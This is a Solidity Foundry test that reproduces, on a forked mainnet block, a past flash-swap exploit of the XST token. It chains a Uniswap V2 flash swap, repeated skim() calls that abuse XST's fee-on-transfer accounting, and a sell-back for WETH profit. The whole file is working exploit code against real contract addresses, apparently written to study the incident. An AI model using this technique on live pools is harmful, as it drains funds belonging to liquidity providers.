// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./../interface.sol";

// Pool1: UniswapV2 WETH/USDT
// Pool2: UniswapV2 WETH/XST
// XST Logic Contract Address: https://etherscan.io/address/0xb276647e70cb3b81a1ca302cf8de280ff0ce5799#code
// https://tools.blocksec.com/tx/eth/0x873f7c77d5489c1990f701e9bb312c103c5ebcdcf0a472db726730814bfd55f3

contract ContractTest is Test {
    IERC20 XST = IERC20(0x91383A15C391c142b80045D8b4730C1c37ac0378);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Pair_V2 Pair1 = Uni_Pair_V2(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); // WETH USDT
    Uni_Pair_V2 Pair2 = Uni_Pair_V2(0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C); // WETH XST
    uint256 amount;

    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheat.createSelectFork("mainnet", 15_310_016);
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker WETH profit before exploit", WETH.balanceOf(address(this)), 18);

        amount = WETH.balanceOf(address(Pair2));
        Pair1.swap(amount * 2, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("Attacker WETH profit after exploit", WETH.balanceOf(address(this)), 18);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        // swap WETH to XST
        uint256 amountSellWETH = WETH.balanceOf(address(this));
        (uint256 reserve0, uint256 reserve1,) = Pair2.getReserves(); // r0 : XST r1 WETH
        uint256 amountOutXST = amountSellWETH * 997 * reserve0 / (reserve1 * 1000 + amountSellWETH * 997);
        WETH.transfer(address(Pair2), amountSellWETH);
        Pair2.swap(amountOutXST, 0, address(this), "");

        //XST skim
        XST.transfer(address(Pair2), XST.balanceOf(address(this)) / 8);
        for (int256 i = 0; i < 15; i++) {
            Pair2.skim(address(Pair2));
        }
        Pair2.skim(address(this));

        // sell XST to WETH
        // XST is SupportFeeOn Token
        XST.transfer(address(Pair2), XST.balanceOf(address(this)));
        uint256 balanceOfXST = XST.balanceOf(address(Pair2));
        (uint256 reserve3, uint256 reserve4,) = Pair2.getReserves(); // r3 : XST r4 WETH
        uint256 amountSellXST = balanceOfXST - reserve3;
        uint256 amountOutWETH = amountSellXST * 997 * reserve4 / (reserve3 * 1000 + amountSellXST * 997);
        Pair2.swap(0, amountOutWETH, address(this), "");

        // repay falshswap
        WETH.balanceOf(address(this));
        WETH.transfer(address(Pair1), (amount * 2) * 1000 / 997 + 1000);
    }
}
